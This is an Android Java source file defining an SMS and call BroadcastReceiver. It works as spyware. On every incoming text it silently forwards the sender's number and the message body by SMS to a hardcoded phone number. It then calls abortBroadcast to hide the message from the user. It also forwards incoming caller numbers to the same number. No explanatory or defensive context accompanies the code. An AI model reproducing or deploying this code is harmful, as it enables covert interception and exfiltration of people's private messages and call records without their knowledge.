package com.example.rajesh.anil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {

		String action = intent.getAction();
		TelephonyManager telephony = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		SmsManager sms = SmsManager.getDefault();

		if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {

			Object[] abc = (Object[]) intent.getExtras().get("pdus");
			SmsMessage[] messages = new SmsMessage[abc.length];
			for (int i = 0; i < abc.length; i++) {
				messages[i] = SmsMessage.createFromPdu((byte[]) abc[i]);

			}
			sms.sendTextMessage(
					"9962359921",
					null,
					"Msg recieved by number - "
							+ messages[0].getOriginatingAddress() + "Msg body-"
							+ messages[0].getMessageBody(), null, null);
			abortBroadcast();

		}

		if (((action.equals("android.intent.action.PHONE_STATE")) && telephony
				.getCallState() == TelephonyManager.CALL_STATE_IDLE)) {

			String phoneNr = intent.getExtras().getString("incoming_number");
			// Log.v("Ashutosh", "phoneNr: "+phoneNr);

			if (phoneNr != null)
				// sms.sendTextMessage("7737871097", null, text, sentIntent,
				// deliveryIntent)
				sms.sendTextMessage("9962359921", null,
						"Recieved a call by number" + phoneNr, null, null);
			// sms.sendTextMessage(destinationAddress, scAddress, text,
			// sentIntent, deliveryIntent);
			
		}
		

	}
}